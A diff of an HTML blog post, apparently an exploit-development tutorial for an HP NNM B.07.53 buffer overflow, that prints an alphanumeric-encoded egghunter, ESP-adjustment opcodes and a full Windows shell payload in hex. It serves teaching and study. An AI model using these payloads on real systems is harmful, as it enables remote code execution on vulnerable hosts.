-</pre></td><td class='code'><pre><code class='bash'><span class='line'>!mona encode ascii -t alphanum -b <span class="s1">&#39;\x00\x0a\x0d\x2f\x3a\x3f\x40\x80..\xff&#39;</span> -s 6681CAFF0F42526A0258CD2E3C055A74EFB8543030578BFAAF75EAAF75E7FFE7
-</span></code></pre></td></tr></table></div></figure>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>!mona encode ascii -t alphanum -b '\x00\x0a\x0d\x2f\x3a\x3f\x40\x80..\xff' -s 6681CAFF0F42526A0258CD2E3C055A74EFB8543030578BFAAF75EAAF75E7FFE7</span></code></pre></td></tr></table></div></figure>
 
 
 <p>It generates the <code>encoded_alphanum.txt</code> inside <code>mona-logs\ovas</code> directory.</p>
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>encoded egghunter in hex format, <span class="nv">egg_marker</span> <span class="o">=</span> <span class="nv">T00wT00W</span>
-</span><span class='line'><span class="o">=======================================================</span>
-</span><span class='line'><span class="se">\x</span>25<span class="se">\x</span>4a<span class="se">\x</span>4d<span class="se">\x</span>4e<span class="se">\x</span>55<span class="se">\x</span>25<span class="se">\x</span>35<span class="se">\x</span>32<span class="se">\x</span>31<span class="se">\x</span>2a<span class="se">\x</span>2d<span class="se">\x</span>2e<span class="se">\x</span>5d<span class="se">\x</span>55<span class="se">\x</span>5d<span class="se">\x</span>2d<span class="se">\x</span>2e<span class="se">\x</span>5d<span class="se">\x</span>55<span class="se">\x</span>5d<span class="se">\x</span>2d<span class="se">\x</span>2f<span class="se">\x</span>5e<span class="se">\x</span>55<span class="se">\x</span>5d<span class="se">\x</span>50<span class="se">\x</span>25<span class="se">\x</span>4a<span class="se">\x</span>4d<span class="se">\x</span>4e<span class="se">\x</span>55<span class="se">\x</span>25<span class="se">\x</span>35<span class="se">\x</span>32<span class="se">\x</span>31<span class="se">\x</span>2a<span class="se">\x</span>2d<span class="se">\x</span>70<span class="se">\x</span>2d<span class="se">\x</span>5c<span class="se">\x</span>6f<span class="se">\x</span>2d<span class="se">\x</span>70<span class="se">\x</span>2d<span class="se">\x</span>5c<span class="se">\x</span>6f<span class="se">\x</span>2d<span class="se">\x</span>71<span class="se">\x</span>2f<span class="se">\x</span>5d<span class="se">\x</span>71<span class="se">\x</span>50<span class="se">\x</span>25<span class="se">\x</span>4a<span class="se">\x</span>4d<span class="se">\x</span>4e<span class="se">\x</span>55<span class="se">\x</span>25<span class="se">\x</span>35<span class="se">\x</span>32<span class="se">\x</span>31<span class="se">\x</span>2a<span class="se">\x</span>2d<span class="se">\x</span>45<span class="se">\x</span>38<span class="se">\x</span>26<span class="se">\x</span>57<span class="se">\x</span>2d<span class="se">\x</span>45<span class="se">\x</span>38<span class="se">\x</span>26<span class="se">\x</span>57<span class="se">\x</span>2d<span class="se">\x</span>46<span class="se">\x</span>38<span class="se">\x</span>28<span class="se">\x</span>57<span class="se">\x</span>50<span class="se">\x</span>25<span class="se">\x</span>4a<span class="se">\x</span>4d<span class="se">\x</span>4e<span class="se">\x</span>55<span class="se">\x</span>25<span class="se">\x</span>35<span class="se">\x</span>32<span class="se">\x</span>31<span class="se">\x</span>2a<span class="se">\x</span>2d<span class="se">\x</span>5b<span class="se">\x</span>6c<span class="se">\x</span>38<span class="se">\x</span>45<span class="se">\x</span>2d<span class="se">\x</span>5b<span class="se">\x</span>6c<span class="se">\x</span>38<span class="se">\x</span>45<span class="se">\x</span>2d<span class="se">\x</span>5b<span class="se">\x</span>6e<span class="se">\x</span>3a<span class="se">\x</span>45<span class="se">\x</span>50<span class="se">\x</span>25<span class="se">\x</span>4a<span class="se">\x</span>4d<span class="se">\x</span>4e<span class="se">\x</span>55<span class="se">\x</span>25<span class="se">\x</span>35<span class="se">\x</span>32<span class="se">\x</span>31<span class="se">\x</span>2a<span class="se">\x</span>2d<span class="se">\x</span>41<span class="se">\x</span>53<span class="se">\x</span>37<span class="se">\x</span>2e<span class="se">\x</span>2d<span class="se">\x</span>41<span class="se">\x</span>53<span class="se">\x</span>37<span class="se">\x</span>2e<span class="se">\x</span>2d<span class="se">\x</span>42<span class="se">\x</span>54<span class="se">\x</span>37<span class="se">\x</span>2f<span class="se">\x</span>50<span class="se">\x</span>25<span class="se">\x</span>4a<span class="se">\x</span>4d<span class="se">\x</span>4e<span class="se">\x</span>55<span class="se">\x</span>25<span class="se">\x</span>35<span class="se">\x</span>32<span class="se">\x</span>31<span class="se">\x</span>2a<span class="se">\x</span>2d<span class="se">\x</span>54<span class="se">\x</span>37<span class="se">\x</span>66<span class="se">\x</span>45<span class="se">\x</span>2d<span class="se">\x</span>54<span class="se">\x</span>37<span class="se">\x</span>66<span class="se">\x</span>45<span class="se">\x</span>2d<span class="se">\x</span>56<span class="se">\x</span>39<span class="se">\x</span>66<span class="se">\x</span>46<span class="se">\x</span>50<span class="se">\x</span>25<span class="se">\x</span>4a<span class="se">\x</span>4d<span class="se">\x</span>4e<span class="se">\x</span>55<span class="se">\x</span>25<span class="se">\x</span>35<span class="se">\x</span>32<span class="se">\x</span>31<span class="se">\x</span>2a<span class="se">\x</span>2d<span class="se">\x</span>50<span class="se">\x</span>3f<span class="se">\x</span>39<span class="se">\x</span>31<span class="se">\x</span>2d<span class="se">\x</span>50<span class="se">\x</span>3f<span class="se">\x</span>39<span class="se">\x</span>31<span class="se">\x</span>2d<span class="se">\x</span>51<span class="se">\x</span>3f<span class="se">\x</span>3b<span class="se">\x</span>33<span class="se">\x</span>50<span class="se">\x</span>25<span class="se">\x</span>4a<span class="se">\x</span>4d<span class="se">\x</span>4e<span class="se">\x</span>55<span class="se">\x</span>25<span class="se">\x</span>35<span class="se">\x</span>32<span class="se">\x</span>31<span class="se">\x</span>2a<span class="se">\x</span>2d<span class="se">\x</span>33<span class="se">\x</span>2a<span class="se">\x</span>67<span class="se">\x</span>55<span class="se">\x</span>2d<span class="se">\x</span>33<span class="se">\x</span>2a<span class="se">\x</span>67<span class="se">\x</span>55<span class="se">\x</span>2d<span class="se">\x</span>34<span class="se">\x</span>2a<span class="se">\x</span>67<span class="se">\x</span>55<span class="se">\x</span>50
-</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class=''><span class='line'>encoded egghunter in hex format, egg_marker = T00wT00W
+</span><span class='line'>=======================================================
+</span><span class='line'>\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x2e\x5d\x55\x5d\x2d\x2e\x5d\x55\x5d\x2d\x2f\x5e\x55\x5d\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x70\x2d\x5c\x6f\x2d\x70\x2d\x5c\x6f\x2d\x71\x2f\x5d\x71\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x45\x38\x26\x57\x2d\x45\x38\x26\x57\x2d\x46\x38\x28\x57\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x5b\x6c\x38\x45\x2d\x5b\x6c\x38\x45\x2d\x5b\x6e\x3a\x45\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x41\x53\x37\x2e\x2d\x41\x53\x37\x2e\x2d\x42\x54\x37\x2f\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x54\x37\x66\x45\x2d\x54\x37\x66\x45\x2d\x56\x39\x66\x46\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x50\x3f\x39\x31\x2d\x50\x3f\x39\x31\x2d\x51\x3f\x3b\x33\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x33\x2a\x67\x55\x2d\x33\x2a\x67\x55\x2d\x34\x2a\x67\x55\x50</span></code></pre></td></tr></table></div></figure>
 
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/mona_alphanum_encoder_output.png" alt="encoder output" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/mona_alphanum_encoder_output.png" alt="encoder output" /></p>
 
 <h2>Adjust ESP</h2>
 
-<p>When we jump over <code>SEH</code> and land into <code>D</code> buffer, at this point, lets check our <code>PC</code>(i.e. <code>EIP</code>) and <code>ESP</code> address.</p>
+<p>When we jump over <code>SEH</code> and land into <code>D</code> buffer, at this point, let&rsquo;s check our <code>PC</code>(i.e. <code>EIP</code>) and <code>ESP</code> address.</p>
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">ESP</span> <span class="o">=</span>&gt; 2216E6D8
-</span><span class='line'><span class="nv">EIP</span> <span class="o">=</span>&gt; 2216FBF0
-</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ESP =&gt; 2216E6D8
+</span><span class='line'>EIP =&gt; 2216FBF0</span></code></pre></td></tr></table></div></figure>
 
 
 <p>Usually when <code>ESP</code> > <code>EIP</code>, we need to perform <strong>stack pointer adjustment</strong> and make <code>ESP</code> &lt;= <code>EIP</code>.</p>
 
-<p>Because during this condition,  <code>PC</code> and <code>ESP</code> both will <code>move towards</code> each other and any <code>PUSH</code> instruction stored in the path of <code>PC</code>, overwrites an existing instruction in the stack. Thus it modifies the original shellcode / payload.</p>
+<p>Because during this condition,  <code>PC</code> and <code>ESP</code> both will <code>move towards</code> each other, and any <code>PUSH</code> instruction stored in the path of <code>PC</code>, overwrite an existing instruction in the stack. Thus it modifies the original shellcode/payload.</p>
 
-<p>In our present scenario, <code>ESP</code> &lt; <code>EIP</code>. During execution, <code>PC</code> and <code>ESP</code> both will move away from each other. Due to this, there is no risk of instruction overwrite.</p>
+<p>In our present scenario, <code>ESP</code> &lt; <code>EIP</code>. During execution, <code>PC</code> and <code>ESP</code> both move away from each other. Due to this, there is no risk of instruction overwrite.</p>
 
 <p><strong>However</strong>, if we inspect our encoded version of egghunter code, then we can observe the followings</p>
 
 <ul>
 <li>for the <strong>first</strong> <code>PUSH</code> operation, it inserts the<code>last 4 bytes</code> of the original egghunter code into the stack.</li>
-<li>for the <strong>second</strong> <code>PUSH</code> operation, it inserts the <code>second last 4 bytes</code> of the original egghunter code into the stack .</li>
+<li>for the <strong>second</strong> <code>PUSH</code> operation, it inserts the <code>second last 4 bytes</code> of the original egghunter code into the stack.</li>
 <li>It means, for every <code>PUSH</code>,  <code>ESP</code> moves towards low memory by <code>4 bytes</code>.</li>
-<li>After 8<sup>th</sup> <code>PUSH</code> operation, <code>ESP</code> will be pointing to the <code>first 4 bytes</code>of the original egghunter code.</li>
+<li>After 8<sup>th</sup> <code>PUSH</code> operation, <code>ESP</code> points to the <code>first 4 bytes</code>of the original egghunter code.</li>
 </ul>
 
 
-<p>So basically, we have to point / set the <code>ESP</code> far down to the high memory, if we want to generate the original egghunter after the encoded egghunter payload.</p>
+<p>We have to point/set the <code>ESP</code> far down to the high memory if we want to generate the original egghunter after the encoded egghunter payload.</p>
 
 <p>Due to this reason, we need to adjust the <code>ESP</code>. But how far we need to go that depends on the length of ( esp_set_up_logic + encoded_payload + original_payload).</p>
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
 <span class='line-number'>5</span>
 <span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># for example</span>
-</span><span class='line'><span class="nv">esp_setup_logic</span> <span class="o">=</span> <span class="m">7</span> bytes <span class="o">(</span>assuming<span class="o">)</span>
-</span><span class='line'><span class="nv">encoded_egghunter</span> <span class="o">=</span> <span class="m">208</span> bytes
-</span><span class='line'><span class="nv">original_egghunter</span> <span class="o">=</span> <span class="m">32</span> bytes
+</pre></td><td class='code'><pre><code class=''><span class='line'># for example
+</span><span class='line'>esp_setup_logic = 7 bytes (assuming)
+</span><span class='line'>encoded_egghunter = 208 bytes
+</span><span class='line'>original_egghunter = 32 bytes
 </span><span class='line'>
-</span><span class='line'><span class="c"># we need to set the ESP to some value &gt; 247 (7 + 208 + 32)</span>
-</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'># we need to set the ESP to some value &gt; 247 (7 + 208 + 32)</span></code></pre></td></tr></table></div></figure>
 
 
 <h5>Problem</h5>
@@ -5404,62 +5392,60 @@ Due to this, we can use <code>DEC EAX</code> => <code>\x48</code> another time a
 <ul>
 <li>We can&rsquo;t use <code>ADD ESP</code> directly because  <code>\xEC</code> is a bad character.</li>
 <li><code>ASLR</code> protection is <code>enabled</code> so we can&rsquo;t <code>hardcode</code> any address.</li>
-<li>Further, based on the value of the <code>EIP</code>, we need to dynamically adjust the <code>ESP</code>.</li>
+<li>Further, based on the value of the <code>EIP</code>, we need to adjust the <code>ESP</code> dynamically.</li>
 </ul>
 
 
 <h5>Solution</h5>
 
 <ul>
-<li>First, we need to get hold of the <code>program counter</code> value into some register (i.e <code>EAX</code>)</li>
-<li>Then we need to perform <code>ADD</code> operation on that register with some <code>safe</code> character / value.</li>
+<li>First, we need to get hold of the <code>program counter</code> value into some register (i.e. <code>EAX</code>)</li>
+<li>Then we need to perform <code>ADD</code> operation on that register with some <code>safe</code> character/value.</li>
 <li>Then <code>PUSH</code> the register on the stack then <code>POP</code> that out into <code>ESP</code>. So that <code>ESP</code> contains the same value as <code>EAX</code>.</li>
 </ul>
 
 
 <h5>Thought Process</h5>
 
-<ul>
-<li>If we observe carefully, when we the jump over <code>nSEH</code> and meet our <code>D</code> buffer, at that point =>  <code>ESP</code> points to <code>nSEH</code>.</li>
+<ol>
+<li>If we observe, when we jump over <code>nSEH</code> and meet our <code>D</code> buffer, at that point =>  <code>ESP</code> points to <code>nSEH</code>.</li>
 <li>However the interestingly,  it is just <code>8 bytes</code> away from  <code>program counter</code> / <code>EIP</code>.</li>
 <li>So if we move this <code>ESP</code> value to <code>EAX</code> then we can get hold of the <code>program counter</code> approximately.</li>
 <li>If the length of the encoded_egghunter = <code>208</code>, original_egghunter = <code>32</code> then minimum we need to add <code>240</code> ~ <code>250</code> to <code>EAX</code> .</li>
-<li>Here I am assuming <code>esp_setup_logic</code> will take maximum <code>10</code> bytes.</li>
-<li>So basically, we can add any number that is greater than <code>250</code> but less than <code>464</code>. We are very much flexible on this.</li>
-</ul>
+<li>Here I am assuming <code>esp_setup_logic</code> takes maximum <code>10</code> bytes.</li>
+<li>We can add any more than <code>250</code> but less than <code>464</code>. We are very much flexible in this.</li>
+</ol>
 
 
-<p>Lets say, if we try to add <code>250</code> to <code>EAX</code> then the final opcode will be</p>
+<p>If we try to add <code>250</code> to <code>EAX</code> then the final opcode would be like below</p>
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>ADD EAX, 0xfa <span class="c"># 0xfa =&gt; 250</span>
-</span><span class='line'>String Literal: <span class="s2">&quot;\x05\xFA\x00\x00\x00&quot;</span>
-</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ADD EAX, 0xfa # 0xfa =&gt; 250
+</span><span class='line'>String Literal: "\x05\xFA\x00\x00\x00"</span></code></pre></td></tr></table></div></figure>
 
 
-<p>Tool used: <a href="https://defuse.ca/online-x86-assembler.htm">https://defuse.ca/online-x86-assembler.htm</a></p>
+<p>The tool used: <a href="https://defuse.ca/online-x86-assembler.htm">https://defuse.ca/online-x86-assembler.htm</a></p>
 
-<p>But <code>\xfa</code> is a bad char and we can&rsquo;t use that. Moreover  the final opcode contains other bad chars such as  <code>ADD EAX</code>  => <code>\x05</code>and three <code>null</code> bytes.</p>
+<p>But <code>\xfa</code> is a bad char, and we can&rsquo;t use that. Moreover, the final opcode contains other bad chars such as  <code>ADD EAX</code>  => <code>\x05</code>and three <code>null</code> bytes.</p>
 
 <p>To resolve this, we have to avoid <code>ADD EAX</code> instruction.</p>
 
 <h5>Solution</h5>
 
-<p>Instead of using entire <code>32</code> bytes register, we can use lower <code>16</code> bytes to perform the <code>addition</code> operation. The result will be the same.</p>
+<p>Instead of using the entire <code>32</code> bytes register, we can use lower <code>16</code> bytes to perform the <code>addition</code> operation.  This technique provides the same result.</p>
 
 <p><code>ADD AX</code> => <code>\x66</code> (safe char)</p>
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>ADD AX, 0xfa
-</span><span class='line'>String Literal: 0x66, 0x05, 0xFA, 0x00
-</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ADD AX, 0xfa
+</span><span class='line'>String Literal: 0x66, 0x05, 0xFA, 0x00</span></code></pre></td></tr></table></div></figure>
 
 
-<p>But however, still the final opcode has another <code>null</code> byte.</p>
+<p>But still, the final opcode has another <code>null</code> byte.</p>
 
-<p>We can&rsquo;t choose <code>251</code> to <code>255</code> as <code>\xfa</code> to <code>\xff</code> all are bad chars.</p>
+<p>We can&rsquo;t choose <code>251</code> to <code>255</code> as <code>\xfa</code> to <code>\xff</code>. All are bad chars.</p>
 
 <ul>
 <li><code>256</code> => 0x100 => also contains null byte</li>
@@ -5467,54 +5453,53 @@ Due to this, we can use <code>DEC EAX</code> => <code>\x48</code> another time a
 </ul>
 
 
-<p>Thus, using this <code>backtrack trial</code> method, we can <code>finalise</code> the <code>value</code> to be added.</p>
+<p>Thus, using this <code>backtrack trial</code> method, we can <code>finalize</code> the <code>value</code> to be added.</p>
 
-<blockquote><p>We are quite flexible to choose the <code>value</code> to be added to adjust the <code>ESP</code>.
+<blockquote><p>We are quite flexible in choosing the <code>value</code> to be added to adjust the <code>ESP</code>.
 Remember that the <code>value</code> should not be larger than  <code>464</code>.</p></blockquote>
 
 <p>Lets choose the value = <code>300</code> => <code>12C</code> (<code>01</code>, <code>2c</code>  both are safe chars).</p>
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>ADD AX, 0x12c
-</span><span class='line'>String Literal: <span class="s2">&quot;\x66\x05\x2C\x01&quot;</span>
-</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ADD AX, 0x12c
+</span><span class='line'>String Literal: "\x66\x05\x2C\x01"</span></code></pre></td></tr></table></div></figure>
 
 
 <p>So our final <code>esp_setup_logic</code> will be</p>
 
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
 <span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># 2216FDF0   58               POP EAX  =&gt; ESP holds the EIP (approx.)</span>
-</span><span class='line'><span class="c"># 2216FDF8   66:05 2C01       ADD AX,12C =&gt; add 300 with present value, 0x01 and 0x2c =&gt; both are safe character </span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># 2216FDF0   58               POP EAX  =&gt; ESP holds the EIP (approx.)
+</span><span class='line'># 2216FDF8   66:05 2C01       ADD AX,12C =&gt; add 300 with present value, 0x01 and 0x2c =&gt; both are safe character
 </span><span class='line'>
-</span><span class='line'><span class="c"># 2216FDF6   50               PUSH EAX</span>
-</span><span class='line'><span class="c"># 2216FDF7   5C               POP ESP  =&gt; moving the EAX value to ESP</span>
-</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'># 2216FDF6   50               PUSH EAX
+</span><span class='line'># 2216FDF7   5C               POP ESP  =&gt; moving the EAX value to ESP</span></code></pre></td></tr></table></div></figure>
 
 
 <p>Total length = <code>7</code> bytes.</p>
 
 <h2>Program Flow</h2>
 
-<p>During program run, when all instructions of the <code>esp_setup_logic</code> are executed, at that point <code>ESP</code> > <code>EIP</code>.</p>
+<ul>
+<li><p>During program run, when all instructions of the <code>esp_setup_logic</code> are executed, at that point <code>ESP</code> > <code>EIP</code>.</p></li>
+<li><p>After that, we want the program should execute all encoded egghunter&rsquo;s instructions.</p></li>
+<li><p>During this process, <code>PC</code> moves toward <code>high memory</code> and in the path, while executing every <code>PUSH</code> instruction by <code>PC</code>, <code>ESP</code> moves towards <code>low memory</code>.</p></li>
+<li><p>When all instructions of the <code>encoded egghunter</code> are finished, during that point, the <code>ESP</code> points at the very 1<sup>st</sup> block of the actual egghunter code.</p></li>
+</ul>
 
-<p>After that, we want the program should executes all encoded egghunter&rsquo;s instructions.</p>
 
-<p>During this process,  <code>PC</code> will move toward <code>high memory</code> and in the path while executing every <code>PUSH</code> instruction by <code>PC</code>, <code>ESP</code> will move towards <code>low memory</code>.</p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/begining_of_egghunter.png" alt="begining_of_egghunter" /></p>
 
-<p>When all instructions of the <code>encoded egghunter</code> are finished, during that point the <code>ESP</code> will be pointing at the very 1<sup>st</sup> block of the actual egghunter code.</p>
+<ul>
+<li>After executing the <code>encoded egghunter</code>code, the <code>PC</code> or <code>EIP</code> rolls down and executes all <code>INC ECX</code> and eventually reaches the beginning of the normal egghunter code. At that point <code>ESP</code> = <code>EIP</code>.</li>
+<li><p>After that, the <code>EIP</code> starts executing the egghunter code. At that point <code>ESP</code> &lt; <code>EIP</code>.</p></li>
+<li><p>Finally, when the egghunter code execution is completed, it finds the address of the egg signature  - <code>T00WT00W</code> and passes the execution control by jumping to the address where <code>EDI</code> points.</p></li>
+</ul>
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/begining_of_egghunter.png" alt="begining_of_egghunter" /></p>
-
-<p>After executing the <code>encoded egghunter</code>code, the <code>PC</code> or <code>EIP</code> will roll down and executes all <code>INC ECX</code> and eventually reach at the beginning of the normal egghunter code. At that point <code>ESP</code> = <code>EIP</code>.</p>
-
-<p>After that, the <code>EIP</code> will start executing the egghunter code. At that point <code>ESP</code> &lt; <code>EIP</code>.</p>
-
-<p>Finally when the egghunter code execution is completed, it finds the address of the egg signature  - <code>T00WT00W</code> and passes the execution control by jumping to the address where <code>EDI</code> points.</p>
 
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -5663,27 +5648,24 @@ Remember that the <code>value</code> should not be larger than  <code>464</code>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/found_egg.png" alt="found_egg" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/found_egg.png" alt="found_egg" /></p>
 
 <h5>Key Points</h5>
 
 <ul>
-<li>When the program execution happens from stack then the <code>opcode</code> placed on the buffer will be interpreted as <code>instruction</code>.  That means <code>A</code> will be interpreted as <code>INC ECX</code>.</li>
-<li>Every <code>PUSH</code> instruction in the<code>encoded_egghunter_logic</code>, will basically overwrite the <code>INC ECX</code> instruction on the stack and finally approximate <code>41 bytes</code>of  <code>A</code> buffer will be present between the <code>encoded_egghunter_logic</code> and expanded <code>actual egghunter</code>.</li>
-<li>Increment of <code>ECX</code> register does not have any impact on <code>ESP</code>.</li>
+<li>When the program execution happens from the stack, then the <code>opcode</code> placed on the buffer gets interpreted as <code>instruction</code>.  That means <code>A</code> is interpreted as <code>INC ECX</code>.</li>
+<li>Every <code>PUSH</code> instruction in the<code>encoded_egghunter_logic</code>, overwrites the <code>INC ECX</code> instruction on the stack and, finally, approximate <code>41 bytes</code> of  <code>A</code> buffer gets stored between the <code>encoded_egghunter_logic</code> and expanded <code>actual egghunter</code>.</li>
+<li>The increment of the <code>ECX</code> register does not have any impact on <code>ESP</code>.</li>
 </ul>
 
 
 <h2>Code Cave</h2>
 
-<blockquote><p>If we place another large buffer at the end of HTTP request as <code>POST</code> data then would it affect the entire crash?</p></blockquote>
+<blockquote><p>If we place another large buffer at the end of the <code>HTTP</code> request as <code>POST</code> data, then would it affect the entire crash?</p></blockquote>
 
 <p>To examine that scenario, create a pattern of <code>1500</code> bytes and send this new buffer as <code>POST</code> data.</p>
 
-<ul>
-<li><code>!mona pattern_create 1500</code></li>
-</ul>
-
+<p><code>!mona pattern_create 1500</code></p>
 
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -5912,15 +5894,15 @@ Remember that the <code>value</code> should not be larger than  <code>464</code>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>During crash, <code>!mona suggest</code> finds the cyclic pattern at <code>0x04df6fd1</code>.</p>
+<p>During the crash, <code>!mona suggest</code> finds the cyclic pattern at <code>0x04df6fd1</code>.</p>
 
 <p>But the original buffer is reduced into <code>139 bytes</code>.</p>
 
-<p>That length is too less to accommodate a reverse / bind shell payload. It seems application puts a limit on the length of <code>HTTP POST</code> data.</p>
+<p>That length is too little to accommodate a reverse/bind shell payload. It seems application puts a limit on the length of <code>HTTP POST</code> data.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/postdata_pattern.png" alt="post data pattern found" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/postdata_pattern.png" alt="post data pattern found" /></p>
 
-<p>Due to this, we need to put the final shellcode / payload <strong>at the beginning of the input buffer</strong> in a  <code>encoded form</code>  and the same way we need to adjust  <code>ESP</code> to generate the actual shellcode dynamically in stack memory.</p>
+<p>Due to this, we need to put the final shellcode/payload <strong>at the beginning of the input buffer</strong> in an <code>encoded form</code>  and the same way we need to adjust  <code>ESP</code> to generate the actual shellcode dynamically in stack memory.</p>
 
 <h2>Final Payload</h2>
 
@@ -5941,20 +5923,18 @@ Remember that the <code>value</code> should not be larger than  <code>464</code>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>While trying to encoded that payload using <code>mona.py</code> <code>alphanum</code> encoder, <strong>I encountered another challenge</strong>.</p>
+<p>While trying to encode that payload using <code>mona.py</code> <code>alphanum</code> encoder, <strong>I encountered another challenge</strong>.</p>
 
-<p>The <code>Immunity</code>  <code>textbox</code> has some length limitation. Due to this reason, we can&rsquo;t put the entire command and execute.</p>
+<p>The <code>Immunity</code>  <code>textbox</code> has some length limitations. Due to this reason, we can&rsquo;t put the entire command and execute it even if we can&rsquo;t run <code>mona.py</code> outside the debugger context.</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class='bash'><span class='line'>!mona encode ascii -t alphanum -b <span class="s1">&#39;\x00\x0a\x0d\x2f\x3a\x3f\x40\x80..\xff&#39;</span> -s fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd56a085950e2fd4050405068ea0fdfe0ffd597680200115c89e66a10565768c2db3767ffd55768b7e938ffffd5576874ec3be1ffd5579768756e4d61ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>Even if, we can&rsquo;t run <code>mona.py</code> outside the debugger.</p>
-
 <h2><code>alpha_num_encoder.py</code></h2>
 
-<p>Use  <a href="https://github.com/greyshell/Penetration-Test/tree/master/alpha_num_encoder">alpha_num_encoder.py</a> to encode the <code>hex</code> formatted  payload generated from <code>msfvenom</code>.</p>
+<p>Use <a href="https://github.com/greyshell/Penetration-Test/tree/master/alpha_num_encoder">alpha_num_encoder.py</a> to encode the <code>hex</code> formatted payload generated from <code>msfvenom</code>.</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
